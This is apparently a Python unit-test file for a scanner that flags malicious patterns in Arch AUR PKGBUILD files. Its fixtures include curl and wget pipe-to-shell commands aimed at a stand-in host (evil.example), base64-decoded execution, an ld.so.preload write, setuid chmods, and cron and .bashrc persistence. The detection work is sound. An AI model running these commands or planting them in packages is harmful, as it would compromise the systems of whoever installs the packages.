import unittest

from aurvet import pkgbuild as pb
from aurvet.rules import Ctx, Finding, Severity, run_all


def ctx_for(text, name="testpkg", info=None, install_paths=frozenset(),
            official=None, npm_badlist=frozenset(), files=None):
    pkg = pb.parse_pkgbuild(text)
    fl = files if files is not None else {"PKGBUILD": text}
    return Ctx(
        name=name, pkg=pkg, info=info or {"Maintainer": "someone", "OutOfDate": None},
        files=fl, install_paths=set(install_paths),
        official_names=set(official or []), npm_badlist=set(npm_badlist),
    )


def rules_of(findings):
    return {f.rule for f in findings}


class NetExecTests(unittest.TestCase):
    def test_pipe_to_shell_blocks(self):
        t = "build() {\n  curl https://evil.example/x.sh | sh\n}\n"
        f = run_all(ctx_for(t))
        self.assertIn("net-exec", rules_of(f))
        self.assertEqual(max(x.severity for x in f), Severity.BLOCK)

    def test_sudo_and_path_variants(self):
        for line in ("curl -fsSL https://x/i | sudo sh",
                     "wget -qO- https://x/i | /bin/bash",
                     "curl -o /tmp/i https://x/i && sh /tmp/i"):
            t = f"build() {{\n  {line}\n}}\n"
            f = run_all(ctx_for(t))
            self.assertIn("net-exec", rules_of(f), line)

    def test_plain_download_ok(self):
        t = ("pkgver() { curl -s https://api.example.com/latest | grep -o '[0-9.]*' | head -1 }\n"
             "source=('https://example.com/foo-${pkgver}.tar.gz')\nsha256sums=('aa')\n")
        f = run_all(ctx_for(t))
        self.assertNotIn("net-exec", rules_of(f))
        self.assertLess(max((x.severity for x in f), default=Severity.INFO),
                        Severity.BLOCK)

    def test_shc_with_download(self):
        t = "build() {\n  sh -c \"$(curl https://evil.example/setup)\"\n}\n"
        self.assertIn("net-exec", rules_of(run_all(ctx_for(t))))


class ObfuscationTests(unittest.TestCase):
    def test_b64_pipe(self):
        t = "package() {\n  echo Zm9v | base64 -d | sh\n}\n"
        self.assertIn("obfuscated-exec", rules_of(run_all(ctx_for(t))))

    def test_long_blob_warns(self):
        blob = "A" * 400
        t = f"build() {{\n  export KEY={blob}\n}}\n"
        f = run_all(ctx_for(t))
        self.assertIn("long-base64", rules_of(f))
        self.assertIn(Severity.WARN, [x.severity for x in f if x.rule == "long-base64"])


class HostTests(unittest.TestCase):
    def test_pastebin_warns(self):
        t = "source=('data::https://pastebin.com/raw/abc123')\n"
        f = run_all(ctx_for(t))
        self.assertIn("suspicious-host", rules_of(f))

    def test_github_ok(self):
        t = "source=('https://github.com/x/y/archive/v1/tar.gz')\nsha256sums=('aa')\n"
        f = run_all(ctx_for(t))
        self.assertNotIn("suspicious-host", rules_of(f))


class SourceHygieneTests(unittest.TestCase):
    def test_http_source_warns(self):
        t = "source=('http://example.com/foo.tar.gz')\nsha256sums=('aa')\n"
        self.assertIn("insecure-source", rules_of(run_all(ctx_for(t))))

    def test_missing_hashes_warns(self):
        t = "source=('https://example.com/foo.tar.gz' 'x::https://example.com/bar.tar.gz')\n"
        f = run_all(ctx_for(t))
        self.assertIn("missing-hashes", rules_of(f))

    def test_complete_hashes_ok(self):
        t = ("source=('https://example.com/foo.tar.gz' 'x::https://example.com/bar.tar.gz')\n"
             "sha256sums=('aa' 'bb')\n")
        f = run_all(ctx_for(t))
        self.assertNotIn("missing-hashes", rules_of(f))


class JsInstallTests(unittest.TestCase):
    def test_known_bad_npm_blocks(self):
        t = "build() {\n  npm install atomic-lockfile\n}\n"
        f = run_all(ctx_for(t, npm_badlist=["atomic-lockfile"]))
        self.assertIn("known-bad-npm", rules_of(f))
        self.assertEqual(max(x.severity for x in f), Severity.BLOCK)

    def test_unknown_js_pkg_warns(self):
        t = "build() {\n  npm install -g some-random-tool\n}\n"
        f = run_all(ctx_for(t))
        self.assertIn("js-build-dep", rules_of(f))

    def test_js_pkg_in_makedeps_suppressed(self):
        t = ("makedepends=('some-random-tool')\n"
             "build() {\n  npm install -g some-random-tool\n}\n")
        f = run_all(ctx_for(t))
        self.assertNotIn("js-build-dep", rules_of(f))

    def test_bare_npm_install_ok(self):
        t = "build() {\n  npm install\n  npm run build\n}\n"
        f = run_all(ctx_for(t))
        self.assertNotIn("js-build-dep", rules_of(f))
        self.assertNotIn("known-bad-npm", rules_of(f))

    def test_trailing_flag_not_a_package(self):
        t = "build() {\n  npm ci --cache\n  npm install --build-from-source --cache ~/.cache\n}\n"
        f = run_all(ctx_for(t))
        self.assertNotIn("js-build-dep", rules_of(f))
        self.assertNotIn("known-bad-npm", rules_of(f))

    def test_local_path_install_not_flagged(self):
        t = "build() {\n  npm install ./cli\n}\n"
        f = run_all(ctx_for(t))
        self.assertNotIn("js-build-dep", rules_of(f))

    def test_bun_wave(self):
        t = "build() {\n  bun install js-digest\n}\n"
        f = run_all(ctx_for(t, npm_badlist=["js-digest"]))
        self.assertIn("known-bad-npm", rules_of(f))


class RootActsTests(unittest.TestCase):
    def test_install_script_persistence(self):
        t = "package() { install -Dm644 unit.service -D $pkgdir/usr/lib/systemd/system/x.service }\n"
        inst = "post_install() {\n  systemctl enable x.service\n  crontab -l 2>/dev/null | cat - '/etc/cron' >> /tmp/cron\n  echo '* * * * * /usr/bin/x' >> ~/.bashrc\n}\n"
        f = run_all(ctx_for(t, install_paths={"foo.install"},
                            files={"PKGBUILD": t, "foo.install": inst}))
        self.assertIn("root-acts", rules_of(f))
        self.assertIn("install-script", rules_of(f))
        details = " ".join(x.detail for x in f if x.rule == "root-acts")
        self.assertIn("systemctl", details)

    def test_ld_so_preload_warns(self):
        t = "package() {\n  echo /usr/lib/evil.so > /etc/ld.so.preload\n}\n"
        self.assertIn("root-acts", rules_of(run_all(ctx_for(t))))

    def test_setuid_chmod_warns(self):
        t = "package() {\n  install -m755 bin/t -D $pkgdir/usr/bin/t\n  chmod u+s $pkgdir/usr/bin/t\n}\n"
        self.assertIn("root-acts", rules_of(run_all(ctx_for(t))))

    def test_setuid_octal_warns(self):
        t = "package() {\n  chmod 4755 $pkgdir/usr/bin/t\n}\n"
        self.assertIn("root-acts", rules_of(run_all(ctx_for(t))))

    def test_plain_755_ok(self):
        t = "package() {\n  find . -type d -exec chmod 755 {} \\\n}\n"
        f = run_all(ctx_for(t))
        self.assertNotIn("root-acts", rules_of(f))


class NamingTests(unittest.TestCase):
    def test_shadow_official(self):
        t = "provides=('python2')\nconflicts=('python2-foo')\n"
        f = run_all(ctx_for(t, official={"python2"}))
        self.assertIn("shadow-official", rules_of(f))

    def test_typosquat_warns(self):
        t = "pkgname=pyth0n\n"
        f = run_all(ctx_for(t, name="pyth0n", official={"python"}))
        self.assertIn("typosquat", rules_of(f))

    def test_no_typosquat_for_distinct(self):
        t = "pkgname=pythonic-tools\n"
        f = run_all(ctx_for(t, name="pythonic-tools", official={"python3"}))
        self.assertNotIn("typosquat", rules_of(f))

    def test_orphan_info(self):
        f = run_all(ctx_for("pkgname=x\n", info={"Maintainer": None, "OutOfDate": None}))
        self.assertIn("orphan", rules_of(f))

    def test_out_of_date_info(self):
        t = "pkgname=x\n"
        f = run_all(ctx_for(t, info={"Maintainer": "m", "OutOfDate": 1750000000}))
        self.assertIn("out-of-date", rules_of(f))


class VcsTests(unittest.TestCase):
    def test_floating_archive_head_warns(self):
        t = "source=('https://github.com/x/y/archive/refs/heads/master.tar.gz')\n"
        f = run_all(ctx_for(t))
        self.assertIn("vcs-floating", rules_of(f))

    def test_pinned_archive_ok(self):
        t = "source=('https://github.com/x/y/archive/refs/tags/v1.2.tar.gz')\n"
        f = run_all(ctx_for(t))
        self.assertNotIn("vcs-floating", rules_of(f))

    def test_codeload_master_warns(self):
        t = "source=('https://codeload.github.com/x/y/tar.gz/refs/heads/master')\n"
        f = run_all(ctx_for(t))
        self.assertIn("vcs-floating", rules_of(f))


class OversizedLineTests(unittest.TestCase):
    FLAG_NOISY = "npm install " + " ".join(f"-x{i}" for i in range(5000))

    def test_oversized_line_warns_and_stays_bounded(self):
        t = f"build() {{\n  {self.FLAG_NOISY}\n}}\n"
        import time
        t0 = time.monotonic()
        f = run_all(ctx_for(t))
        self.assertLess(time.monotonic() - t0, 5)
        self.assertIn("oversized-line", rules_of(f))
        # the truncated prefix still allows the JS rule to see the leading
        # portion - but no finding should quote the full 30KB line
        for x in f:
            self.assertLessEqual(len(x.detail), 4096)

    def test_oversized_blob_still_flags_base64(self):
        blob = "A" * (20 * 1024)
        t = f"build() {{\n  export K={blob}\n}}\n"
        f = run_all(ctx_for(t))
        self.assertIn("oversized-line", rules_of(f))
        self.assertIn("long-base64", rules_of(f))


class BenignPackageTests(unittest.TestCase):
    BENIGN = """
# Maintainer: someone <x@y.z>
pkgname=foobar
pkgver=1.2.3
pkgrel=1
pkgdesc="A perfectly ordinary tool"
arch=(x86_64)
url="https://example.com/foobar"
license=(MIT)
depends=('glib>=2.80' 'openssl')
makedepends=('meson' 'ninja')
source=("https://github.com/x/foobar/releases/download/v${pkgver}/foobar-${pkgver}.tar.gz"
        "foobar-${pkgver}.tar.gz.sig")
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
            'SKIP')

build() {
  meson setup build .
  meson compile -C build
}

package() {
  meson install -C build
}
"""

    def test_benign_is_clean(self):
        f = run_all(ctx_for(self.BENIGN, name="foobar",
                            info={"Maintainer": "x", "OutOfDate": None}))
        blocks = [x for x in f if x.severity == Severity.BLOCK]
        warns = [x for x in f if x.severity == Severity.WARN]
        self.assertEqual(blocks, [], [x.detail for x in blocks])
        self.assertEqual(warns, [], [x.detail for x in warns])


if __name__ == "__main__":
    unittest.main()
